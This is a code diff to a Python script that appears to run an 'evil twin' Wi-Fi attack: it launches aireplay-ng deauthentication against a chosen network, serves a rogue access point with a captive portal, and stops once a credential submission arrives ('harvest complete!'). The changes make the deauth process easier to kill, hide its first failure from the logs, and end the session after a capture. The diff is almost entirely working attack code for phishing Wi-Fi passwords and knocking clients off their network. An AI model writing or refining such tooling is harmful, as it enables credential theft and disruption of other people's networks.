@@ -5,6 +5,7 @@ import sys
 import time
 import subprocess
 import threading
+import signal
 import logging
 from typing import List, Dict, Optional
 from datetime import datetime
@@ -54,6 +55,9 @@ AP_SSID: Optional[str] = None
 HTTP_SERVER: Optional[HTTPServer] = None
 HOSTAPD_PROC: Optional[subprocess.Popen] = None
 DNSMASQ_PROC: Optional[subprocess.Popen] = None
+DEAUTH_ACTIVE = True
+DEAUTH_FAILURES = 0
+SILENT_INITIAL_DEAUTH_FAILURES = 1
 
 
 def load_portal_html() -> str:
@@ -351,6 +355,7 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
             stdout=subprocess.DEVNULL,
             stderr=subprocess.PIPE,
             text=True,
+            preexec_fn=os.setsid,
         )
     except FileNotFoundError:
         logging.error("Required tool 'aireplay-ng' not found!")
@@ -372,11 +377,21 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
 def stop_attack() -> None:
     global ATTACK_PROCESS
     if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
-        ATTACK_PROCESS.terminate()
+        try:
+            os.killpg(os.getpgid(ATTACK_PROCESS.pid), signal.SIGTERM)
+        except Exception:
+            ATTACK_PROCESS.terminate()
         try:
             ATTACK_PROCESS.wait(timeout=3)
         except subprocess.TimeoutExpired:
-            ATTACK_PROCESS.kill()
+            try:
+                os.killpg(os.getpgid(ATTACK_PROCESS.pid), signal.SIGKILL)
+            except Exception:
+                ATTACK_PROCESS.kill()
+        for _ in range(5):
+            if ATTACK_PROCESS.poll() is not None:
+                break
+            time.sleep(0.2)
     ATTACK_PROCESS = None
 
 
@@ -602,12 +617,14 @@ def disclaimer_confirmed(ssid: str, bssid: str) -> bool:
 
 def run_twins_session() -> bool:
     global ATTACK_INTERFACE, AP_INTERFACE, AP_SSID, CAPTURE_FILE_PATH, HTTP_SERVER
-    global HOSTAPD_PROC, DNSMASQ_PROC
+    global HOSTAPD_PROC, DNSMASQ_PROC, DEAUTH_ACTIVE, DEAUTH_FAILURES
 
     SUBMISSION_EVENT.clear()
     with SUBMISSION_LOCK:
         global LAST_SUBMISSION_IP
         LAST_SUBMISSION_IP = None
+    DEAUTH_ACTIVE = True
+    DEAUTH_FAILURES = 0
 
     interfaces = list_network_interfaces()
     ATTACK_INTERFACE = select_interface(interfaces, "Select attack interface")
@@ -679,31 +696,28 @@ def run_twins_session() -> bool:
                         err_output = ATTACK_PROCESS.stderr.read().strip()
                     except Exception:
                         err_output = ""
-                if err_output:
-                    logging.warning("Deauth process exited unexpectedly: %s", err_output)
-                else:
-                    logging.warning("Deauth process exited unexpectedly.")
-                logging.info("Restarting deauth in %s seconds...", restart_delay)
-                time.sleep(restart_delay)
-                if not start_deauth_attack(ATTACK_INTERFACE, target_network):
-                    logging.error("Failed to restart deauth attack.")
-                    return False
+                DEAUTH_FAILURES += 1
+                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
+                    if err_output:
+                        logging.warning("Deauth process exited unexpectedly: %s", err_output)
+                    else:
+                        logging.warning("Deauth process exited unexpectedly.")
+                if DEAUTH_ACTIVE:
+                    time.sleep(restart_delay)
+                    if not start_deauth_attack(ATTACK_INTERFACE, target_network):
+                        logging.error("Failed to restart deauth attack.")
+                        return False
 
             if SUBMISSION_EVENT.is_set():
                 with SUBMISSION_LOCK:
                     SUBMISSION_EVENT.clear()
 
+                DEAUTH_ACTIVE = False
                 stop_attack()
+                if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
+                    logging.error("Failed to stop deauth process; forcing cleanup.")
                 logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
-                while True:
-                    exit_choice = input(
-                        f"{style('Exit script', STYLE_BOLD)} (E) or {style('restart', STYLE_BOLD)} (R): "
-                    ).strip().lower()
-                    if exit_choice in {"e", "exit"}:
-                        return False
-                    if exit_choice in {"r", "restart"}:
-                        return True
-                    logging.warning("Please enter E or R.")
+                return False
 
             for i, proc in enumerate(processes):
                 if proc and proc.poll() is not None:
